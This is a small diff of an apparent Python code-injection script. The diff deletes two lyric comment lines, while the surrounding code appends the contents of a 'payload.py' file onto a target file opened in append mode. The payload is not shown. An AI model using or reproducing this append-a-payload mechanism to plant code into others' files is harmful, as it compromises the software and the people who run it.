@@ -32,9 +32,6 @@ if __name__ == "__main__":
         exit()
 
     with open(path, 'a') as version:
-        version.write("# You know I haven't imagined that art can be a weapon\n")
-        version.write("# 'til I met her ...\n")
-        
         with open(os.path.join(execution_path, "payload.py"), 'r') as payload:
             version.write(payload.read())
 
